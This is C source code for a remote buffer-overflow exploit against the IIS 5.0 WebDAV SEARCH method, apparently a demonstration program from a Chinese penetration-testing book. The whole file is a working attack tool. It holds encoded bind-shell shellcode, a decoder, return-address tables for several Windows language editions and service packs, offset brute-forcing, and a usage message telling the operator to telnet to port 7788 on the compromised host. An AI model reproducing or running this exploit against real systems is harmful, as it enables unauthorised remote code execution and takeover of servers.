/* xWebDav.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  IIS WebDAV栈溢出利用程序
*/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma  comment(lib,"ws2_32")
#define	NOPCODE				0x4F//0x4F//'O'
#define BUFFLEN				65536+8//传递给GetFileAttribeExW的buff长度
#define OVERPOINT			0x260//溢出点-0x14 SEH-0x4
#define	MaxTry				8//连接失败后重试次数
#define	DefaultOffset			23
#define	RecvTimeOut			30000//ms, 30s
#define	StartOffset			6
#define	EndOffset			80
#define	RetAddrNum			12//可用的ret addr数量
/*严重错误，程序退出*/
#define	ERROR_OTHER			0//other error
#define	ERROR_METHOD_NOT_SUPORT		1//no valu
#define	ERROR_NOT_IIS			2//not iis
/*继续猜测offset*/
#define	ERROR_RESOURCE_NOTFOUND		3//offset error
#define	ERROR_BAD_REQUEST		4//offset error?
/*成功了?*/
#define	ERROR_RECV_TIMEOUT		5//success?
/*尝试不同的ret addr*/
#define	ERROR_CONNECT_RESET		6//offset ok?但ret addr错误
#define	ERROR_CONNECT_FALIED		7//can't connect
//[100 bytes]
unsigned char	decoder[] =
"%u754F%u7409%u4E07%u584A%u9050%u4FC3%u9053%u665E"
"%u4EAD%u4F46%u6643%u973D%u906F%u9051%u7559%u53F0"
"%u5F56%u574A%u6643%u50AD%u6643%u4F3D%u9000%u7459"
"%u4ED5%u642C%u5950%u4F46%u9047%u6643%u50AD%u584B"
"%u642C%u574A%u9051%u5F90%uFF03%uFF03%uFF03%uFF03"
"%u0391%u91CF%u5F90%u90AA%u7441%u90CA%u9051%u7559"
"%u4EC4%u6F97";
/*绑定cmd的shellcode是从isno的exploit上copy过来的*/
unsigned char	xShellCode[]=
"mdrodgiqrodirlslsssssslgpieimdmdmdlopiggpmjjomeddgidldgdmkhdrfsnkrlrmimkmkpqephq"
"ehkpmdsqjlphsggjmkmkmkmkpksgerofmkmkmkmknhhpfpmkmkkkrdkshomjmkmkejjpmkmkjlflmleh"
"immjmkmkejihmkmkmjmkseejnpqnpqrfkdnhikepqhnomhihseejnspkqfrfhrehikrsepnkmhjhepqm"
"momhipejnrqpqfpiqmrfifejrrmgqfqonhnirffonhjlepqeokmhihepipmhmsejnrqdsfrgpkrfmrej"
"rrmgrislshqjrgmeqdehikmgkpkfmhjlmhjpeppeogmhjqnhhiseepldepjqepqelkqsmhjsnhirepil"
"mhirmhirmhqmlomhipepnrmhjpkrsrmjmkmkpmedjdephdnhikjdhkepisjiglernienqimspipkphjl"
"lipqerqimgenrilfpipejlpimgpqnhikgoegikrfjrnhireqmmegirrgmrpipephjllipqgpkiksqepi"
"pejlpimgpqephsnhikgoegikrfjrnhireqmmekjrmirgmrpipephjllipqgpkikdnhikpkqkpkqkpkjl"
"pdksdhsqlkpephjlpdkosqmiphjlpdjknhikpdpkfkmogppsgpqkgpplqspkpdpegnpejlpdikqspkpd"
"gnpegnpejlpdikqsfkqgermdpdjlpdignhikepqejgerqdnoerqdqkepmeerqdnsnhiksefsmjmjerqd"
"oopdpdnhikpkpkpkqkpkqspkpkgnpenhikpkjlpdisjlrejkjlpdiojlrejojlpdioqspkpkphjlpdjg"
"ephsnhikfgmgpkijksmgpkjlpdhgepjknhikepisffmgpkpkpdpjpejlrdgsjlpdhkehnlmjrooinhik"
"pkpdjlndpejlrdgsjlpdhompikrgolnhikpkjlndpephjlpdjssqpkjlpdkkkpisnhikpkfgmgpkpeph"
"jlpdjopdnhirpjpkpejlrdgojlpdhssqpkjlpdkkkpgqpkjlpdkgkpjmpspkerqijiihepqgogmomffs"
"mkmkmkidmkrspenglinhikihkpkokskijnjljlksdijmjljlqppekdrdohekkdrdqoslsjsgqosrsiri"
"sjrirrqjmkqpqfpiqmqfqonhnimkqhrisfsjrgsfpksrrksfmkqdsfrgphrgsjrirgrfrkqrsmseslqj"
"mkqhrisfsjrgsfpkrislshsfrhrhqjmkqhsoslrhsfqssjsmsgsosfmkpksfsfspqmsjsnsfsgpksrrk"
"sfmkqdsoslsisjsoqjsososlshmkpdrisrrgsfqesrsosfmkpisfsjsgqesrsosfmkphsosfsfrkmkqf"
"rssrrgpkrislshsfrhrhmkmkpdphqlqhqpnhnimkrhslshspsfrgmksisrsmsgmksosrrhrgsfsmmksj"
"shshsfrkrgmkrhsfsmsgmkrisfshremkmimklmsomkmkmkmkmkmkmkmkmkmkmkmkshsnsgomsfrssfmk"
"jljljljldd";

unsigned char	jmpover[]="%u9041%u6841";//0x41 inc ecx , 0x68  push num32
unsigned int	g_iConnectError=0;

unsigned int	g_iRetAddrList[3][4]={
	{
		0x74FB63DB,//call ebx addr at ws2_32.dll in sp0_cn_tw，符合(cn、tw) wide char编码
		0x74FB4F6F,//call ebx addr at ws2_32.dll in sp1_cn_tw，符合(cn、tw) wide char编码
		0x74FB9631,//call ebx addr at ws2_32.dll in sp2_cn_tw，符合(cn、tw) wide char编码
		0x74FB4ECB//call ebx addr at ws2_32.dll in sp3_cn_tw，符合(cn、tw) wide char编码
	},
	{
		0x77AD8A23,//call ebx addr at ole32.dll in sp0_jp_ko，符合(jp,ko) wide char编码
		0x77AD9F9C,//call ebx addr at ole32.dll in sp1_jp_ko，符合(jp,ko) wide char编码
		0x77AD653F,//call ebx addr at ole32.dll in sp2_jp_ko，符合(jp,ko) wide char编码
		0x77A5005D//call ebx addr at ole32.dll in sp3_jp_ko，符合(jp,ko) wide char编码
	},
	{
		0x77AC608C,//call ebx addr at ole32.dll in sp0_en，符合(cn、tw、jp、KO) wide char编码
		0x77A5592A,//call ebx addr at ole32.dll in sp1_en，符合(cn、tw、jp、KO) wide char编码
		0x12345678,//call ebx addr at ole32.dll in sp2_en，符合(cn、tw、jp、KO) wide char编码
		0x77AC70DD//call ebx addr at ole32.dll in sp3_en，符合(cn、tw、jp、KO) wide char编码
	}
};
int	SendBuffer(char *ip, int iPort, unsigned char *buff, int len);
int MakeExploit(unsigned int retaddr, int offset, char *host, char *ip, int iPort);
void usage();

void main(int argc, char **argv)
{
	int				i, iRet,k,iOsType, iSP;
	unsigned int	iOffset,iPort,iStartOffset, iEndOffset,iCorrectOffset;
	char			*ip,*host;
	unsigned int	iRetAddrList[RetAddrNum], iRetAddrNum;

	memset(iRetAddrList, 0, sizeof(iRetAddrList));
	iRetAddrNum=0;
	ip=NULL;
	host=NULL;
	iPort=80;
	iOsType=-1;
	iSP=-1;
	iOffset=0;
	iCorrectOffset=0;

	if(argc<3)
	{
		usage();
		return;
	}
	for(i=1;i<argc;i+=2)
	{
		if(strlen(argv[i]) != 2)
		{
			usage();
			return;
		}
		//检查是否缺少参数
		if(i == argc-1)
		{
			usage();
			return;
		}
		switch(argv[i][1])
		{
		case 'i':
			ip=argv[i+1];
			break;
		case 'h':
			host=argv[i+1];
			break;
		case 'p':
			iPort=atoi(argv[i+1]);
			break;
		case 't':
			iOsType=atoi(argv[i+1]);
			break;
		case 's':
			iSP=atoi(argv[i+1]);
			break;
		case 'o':
			iOffset=atoi(argv[i+1]);
			break;
		}
	}
	//检查参数
	if(!ip)
	{
		usage();
		return;
	}
	if(!host) host=ip;

	if(!iOffset) 
	{
		iStartOffset = StartOffset;
		iEndOffset = EndOffset;
	}
	else
	{
		if((iOffset < StartOffset) || (iOffset > EndOffset))
		{
			usage();
			return;
		}
		else
		{
			iStartOffset = iOffset;
			iEndOffset = iOffset;
		}
	}

	if((iOsType > 2) || (iSP > 3))
	{
		usage();
		return;
	}
	//brute force
	if((iOsType == -1) && (iSP == -1))
	{
		memcpy(iRetAddrList, g_iRetAddrList, sizeof(iRetAddrList));
		iRetAddrNum = sizeof(iRetAddrList)/sizeof(int);
	}
	if((iOsType == -1) && (iSP != -1))
	{
		for(i=0;i<3;i++)
			iRetAddrList[iRetAddrNum++] = g_iRetAddrList[i][iSP];
	}
	if((iOsType != -1) && (iSP == -1))
	{
		for(i=3;i>=0;i--)
			iRetAddrList[iRetAddrNum++] = g_iRetAddrList[iOsType][i];
	}
	if((iOsType != -1) && (iSP != -1))
		iRetAddrList[iRetAddrNum++] = g_iRetAddrList[iOsType][iSP];

	printf( "IP\t\t:%s\n"
			"Host\t\t:%s\n"
			"Port\t\t:%d\n"
			"Offset\t\t:%d-%d\n"
			"iOffset\t\t:%d\n"
			"OsType\t\t:%d\n"
			"SP\t\t:%d\n"
			"RetAddrNum\t:%d\n",ip,host,iPort,iStartOffset, iEndOffset, 
iOffset,iOsType,
			iSP,iRetAddrNum);
	for(i=0;i<iRetAddrNum;i++)
		printf("%.8X ", iRetAddrList[i]);
	printf("\nStart exploit[y/n]:");
	if (getchar() == 'n') return;

	k=0;
	for(i=iStartOffset;i<=iEndOffset;i++)
	{
		//如果是猜测offset，先试23
		if(i==StartOffset) i=DefaultOffset;
		else if((i==DefaultOffset) && (iOffset==0)) continue;
		printf("try offset:%d\tuse retaddr:0x%.8X\n", i, iRetAddrList[k]);
		iRet = MakeExploit(iRetAddrList[k], i, host, ip, iPort);

		switch(iRet)
		{
			case ERROR_NOT_IIS:
			case ERROR_METHOD_NOT_SUPORT:
			case ERROR_OTHER:
				exit(1);
				break;
			case ERROR_CONNECT_FALIED:
				printf("can't connect to %s:%d", ip, iPort);
				//第一次就连接不上，或超出最大重试次数
				if( (i==DefaultOffset) || (g_iConnectError > MaxTry) )
				{
					printf(", exit.\n");
					exit(1);
				}
				printf(", wait for try again.\n");
				Sleep(5000);	
				//same offset、retaddr try again
				i--;
				break;
			case ERROR_CONNECT_RESET:
				iCorrectOffset = i;
				break;
			case ERROR_RECV_TIMEOUT:
				printf("recv buff timeout.Maybe success?\n");
				exit(1);
				break;
		}
		if(i==DefaultOffset) i=6;
		if(iCorrectOffset) break;
		//getchar();
	}

	if(iCorrectOffset) 
		printf( "-=-= we got correct offset:%d -=-=\n"
				"-=-= but retaddr %.8X error -=-=\n", iCorrectOffset, 
iRetAddrList[k]);
	else return;

	if(iRetAddrNum<2) return;
	//尝试其他retaddr
	for(k=1;k<iRetAddrNum;k++)
	{
		Sleep(5000);
		printf("use offset:%d\ttry retaddr:0x%.8X\n", iCorrectOffset, 
iRetAddrList[k]);
		iRet = MakeExploit(iRetAddrList[k], iCorrectOffset, host, ip, 80);
		switch(iRet)
		{
			case ERROR_CONNECT_FALIED:
				printf("can't connect to %s:%d", ip, iPort);
				if(g_iConnectError > MaxTry)
				{
					printf(", eixt.\n");
					exit(1);
				}
				else
					printf(", wait for try again.\n");
				k--;
				break;
			case ERROR_CONNECT_RESET:
				printf("retaddr error, wait for try another.\n");
				break;
			case ERROR_RECV_TIMEOUT:
				printf("recv buff timeout.Maybe success?\n");
				exit(1);
				break;
			default:
				exit(1);
		}
	}
	printf("Done.\n");
}

int	SendBuffer(char *ip, int iPort, unsigned char *buff, int len)
{
	struct sockaddr_in sa;
	WSADATA	wsd;
	SOCKET	s;
	int		iRet, iErr;
	char	szRecvBuff[0x1000];
	int		i;

	iRet = ERROR_OTHER;
	memset(szRecvBuff, 0, sizeof(szRecvBuff));
	__try
	{
		if (WSAStartup(MAKEWORD(1,1), &wsd) != 0)
		{
			printf("WSAStartup error:%d\n", WSAGetLastError());
			__leave;
		}

		s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET)
		{
			printf("\nCreate socket failed:%d",GetLastError());
			__leave;
		}
		//set socket recv timeout
		i=RecvTimeOut;
		setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&i,sizeof(i));

		sa.sin_family=AF_INET;
		sa.sin_port=htons(iPort);
		sa.sin_addr.S_un.S_addr=inet_addr(ip);

		iErr = connect(s,(struct sockaddr *)&sa,sizeof(sa));
		if(iErr == SOCKET_ERROR)
		{
			iRet = ERROR_CONNECT_FALIED;
			g_iConnectError++;
			__leave;
		}
		//reset flag
		g_iConnectError=0;
		iErr = send(s, buff, len,0);
		if(iErr == SOCKET_ERROR)
		{
			printf("send buffer error:%d.\n", WSAGetLastError());
			__leave;
		}

		iErr = recv(s, szRecvBuff, sizeof(szRecvBuff), 0);
		if(iErr == SOCKET_ERROR)
		{
			if(WSAGetLastError() == WSAETIMEDOUT) iRet = ERROR_RECV_TIMEOUT;
			if(WSAGetLastError() == 10054) iRet = ERROR_CONNECT_RESET;
			//printf("recv buffer error:%d.\n", WSAGetLastError());
			__leave;
		}
		if(strstr(szRecvBuff, "Microsoft-IIS/5.0") == NULL)
		{
			iRet = ERROR_NOT_IIS;
			printf("Target not iis.\n");
			__leave;
		}
		if(strstr(szRecvBuff, "404 Resource Not Found"))
		{
			iRet = ERROR_RESOURCE_NOTFOUND;
			__leave;
		}
		if(strstr(szRecvBuff, "400 Bad Request"))
		{
			iRet = ERROR_BAD_REQUEST;
			__leave;
		}
		if(strstr(szRecvBuff, "501 Not Supported"))
		{
			iRet = ERROR_METHOD_NOT_SUPORT;
			printf("501 Not Supported\n");
			__leave;
		}
	}
	__finally
	{
		if(s != INVALID_SOCKET) closesocket(s);
		WSACleanup();
	}
	return iRet;
}
//
//offset为IIS PATH的长度
//
int MakeExploit(unsigned int retaddr, int offset, char *host, char *ip, int iPort)
{
	unsigned char jmpaddr[16];
	unsigned char *pStr, szNOP[4];
	int		i, iNop, iRet;

	szNOP[0]=NOPCODE;
	szNOP[1]='\0';
	//转换字符格式
	sprintf(jmpaddr,"%%u%.2X%.2X%%u%.2X%.2X", retaddr>>8&0xFF, retaddr&0xFF,
		retaddr>>24&0xFF, retaddr>>16&0xFF);
	//分配内存
	pStr = (unsigned char *)malloc(40000);
	//组合buffer
	strcpy(pStr, "SEARCH /");
	//填充NOP CODE  IISPATH+NOP = 0x260/2
	for(i=offset;i<OVERPOINT/2;i++)
		strcat(pStr, szNOP);
	//jmp to decoder
	strcat(pStr, jmpover);
	//jmp addr
	strcat(pStr, jmpaddr);
	//decode real shellcode
	strcat(pStr, decoder);
	//real shellcode
	strcat(pStr, xShellCode);
	//计算后面还需填充多少个NOP CODE
	iNop = (BUFFLEN-OVERPOINT-8-strlen(decoder)/3-strlen(xShellCode)*2)/2;
	//填充NOP CODE
	for(i=0;i<iNop;i++)
		strcat(pStr, szNOP);
	strcat(pStr, " HTTP/1.0\n"
				 "Content-Type: text/xml\n"
				 "Content-length:8\n\n"
				 "OOOOOOOO\n\n");
	//发送我们精心构造的buff
	iRet = SendBuffer(ip, iPort, pStr, strlen(pStr));
	//释放内存
	free(pStr);
	return iRet;
}

void usage()
{
	printf( "\nxWebDav -> IIS5.0 webdav remote buffer overflow exploit\n"
			"Writen by ey4s<cooleyas@21cn.com>\n"
			"Thanks to yuange,moda,isno.\n"
			"2004-04-24\n"
			"if success, telnet to target:7788\n\n"
			"usage: xWebDav <-i ip> [-h host] [-p port] [-t OsType] [-s sp] [-o 
offset]\n\n"
			"[OsType]\n"
			"0\tSimplified Chinese,Traditional Chinese.\n"
			"1\tJapanese,Korean.\n"
			"2\tOS is English edition and system default codepage is 
CN、TW、JP、KR.\n\n"
			"[sp]\n"
			"0\tservice pack 0(default install,not any patch)\n"
			"1\tservice pack 1\n"
			"2\tservice pack 2\n"
			"3\tservice pack 3\n\n"
			"[offset]\n"
			"7-80\n\n"
			"[example]\n"
			"xWebDav -i 1.1.1.1                  <- brute force mode\n"
			"xWebDav -i 1.1.1.1 -t 1             <- try exploit JP、KR sp0-3\n"
			"xWebDav -i 1.1.1.1 -t 1 -s 3 -o 23  <- try exploit JP、KR sp3 use 
offset 23\n\n");
}
